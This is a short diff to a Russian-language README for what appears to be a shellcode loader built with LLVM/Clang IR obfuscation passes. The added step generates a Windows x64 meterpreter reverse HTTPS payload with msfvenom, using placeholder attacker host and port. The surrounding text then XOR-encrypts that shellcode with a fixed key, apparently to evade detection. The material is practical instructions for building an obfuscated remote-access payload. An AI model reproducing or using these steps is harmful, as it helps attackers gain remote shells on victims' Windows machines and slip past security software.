@@ -44,6 +44,11 @@
 Сборка выполняется на Linux (рекомендуется Kali Linux) с использованием **LLVM/Clang 21** и пассов оптимизации `opt` для трансформации промежуточного представления (IR).
 
 ### Шаг 1 — Подготовка зашифрованных данных
+Создайте бинарный файл (`shellcode.bin`)
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST={IP} LPORT={PORT} -f raw > shellcode.bin
+```
 
 Зашифруйте исходный бинарный файл (`shellcode.bin`) с ключом `0x5A`:
 
